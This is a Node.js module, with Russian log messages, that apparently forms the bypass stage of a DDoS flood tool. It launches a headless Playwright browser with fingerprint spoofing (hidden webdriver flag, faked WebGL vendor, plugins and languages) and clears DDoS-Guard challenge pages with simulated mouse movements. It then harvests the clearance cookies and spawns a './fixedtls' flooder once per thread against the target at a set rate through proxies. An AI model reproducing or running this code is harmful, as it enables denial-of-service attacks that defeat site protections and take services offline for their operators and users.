const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;

const JSList = {
  js: [
    {
      name: "Ddos",
      navigations: 1,
      locate: '<title>DDoS-Guard</title>'
    }
  ]
};

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError",
  "TimeoutError", "DeprecationWarning"
];

const ignoreCodes = [
  "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
  "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
  "ESOCKETTIMEDOUT", "EPROTO", "DEP0123",
  "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
];

process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);
process.on("SIGHUP", () => {});
process.on("SIGCHLD", () => {});

function handleError(e) {
  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
  console.warn(e);
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function log(msg) {
  const now = new Date();
  const time = now.toTimeString().split(' ')[0];
  console.log(`(${time}) - ${msg}`);
}

const randomIntFromInterval = (min, max) =>
  Math.floor(Math.random() * (max - min + 1) + min);

function cookiesToStr(cookies) {
  return cookies.map(({ name, value }) => `${name}=${value}`).join(";");
}

function JSDetection(html) {
  return JSList.js.find(({ locate }) => html.includes(locate));
}

async function solverInstance(args) {
  log(`(${`PlayWright`.cyan}) Запуск браузера.`);

  const browser = await playwright.chromium.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-features=site-per-process,IsolateOrigins',
      '--disable-infobars',
      '--no-first-run',
      '--ignore-certificate-errors',
      '--ignore-ssl-errors',
      '--no-default-browser-check',
      '--disable-popup-blocking',
      '--disable-extensions',
      '--disable-background-networking',
      '--disable-background-timer-throttling',
      '--disable-renderer-backgrounding',
      '--disable-hang-monitor',
      '--disable-sync',
      '--metrics-recording-only',
      '--disable-default-apps',
      '--mute-audio',
      '--no-zygote',
      '--max-connections-per-host=6',
      '--autoplay-policy=no-user-gesture-required',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  function getRandomUAConfig() {
    const configs = [
      {
        name: 'Windows Chrome',
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        viewport: { width: 1920, height: 1080 },
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false
      },
      {
        name: 'iPhone Safari',
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        viewport: { width: 390, height: 844 },
        deviceScaleFactor: 3,
        isMobile: true,
        hasTouch: true
      }
    ];
    return configs[Math.floor(Math.random() * configs.length)];
  }

  const uaConfig = getRandomUAConfig();
  log(`(${`UA`.cyan}) Используется профиль: ${uaConfig.name.green}`);

  const context = await browser.newContext({
    userAgent: uaConfig.userAgent,
    viewport: uaConfig.viewport,
    deviceScaleFactor: uaConfig.deviceScaleFactor,
    isMobile: uaConfig.isMobile,
    hasTouch: uaConfig.hasTouch,
    javaScriptEnabled: true
  });

  const page = await context.newPage();

  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    window.chrome = { runtime: {} };
    Object.defineProperty(navigator, 'languages', {
      get: () => ['ru-RU', 'ru']
    });
    Object.defineProperty(navigator, 'plugins', {
      get: () => [1, 2, 3]
    });
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.call(this, parameter);
    };
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : originalQuery(parameters)
    );
  });

  try {
    await page.goto(args.Target, { waitUntil: 'domcontentloaded' });
  } catch (e) {
    await browser.close();
    throw e;
  }

  log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);

  await processProtection(page, 'JSDetect [1/2]');
  await processProtection(page, 'JSDetect [2/2]');

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();

  log(`(${`Harvester`.green}) Заголовок: ${title}`);
  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);

  for (let i = 0; i < args.Threads; i++) {
    spawn('./fixedtls', [args.Target, uaConfig.userAgent, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
  }

  log(`(${`PlayWright`.green}) Сессия закрыта.`);
  await browser.close();
  return cookies;
}

async function processProtection(page, label) {
  const html = await page.content();
  const title = await page.title();

  if (title === "Access denied") {
      await sleep(10000);
      await page.waitForNavigation();
      log(`(${`Playwright`.green}) Ип заблокирова ${title}`);
    return;
  }

  const detected = JSDetection(html);
  if (detected) {
    log(`(${label.green}) защита: ${detected.name.yellow}`);


 

    if (["ddos"].includes(detected.name)) {
      for (let i = 0; i < 5; i++) {
        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
      }
      await page.mouse.down();
      await page.mouse.move(100, 100);
      await page.mouse.up();
      await page.waitForNavigation();
      log(`(${`Playwright`.green}) title web after navigation: ${title}`);
    }

    for (let i = 0; i < detected.navigations; i++) {
      await page.waitForNavigation();
      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
    }
  } else {
    log(`(${label}) No security `);
  }
}

module.exports = {
  solverInstance
};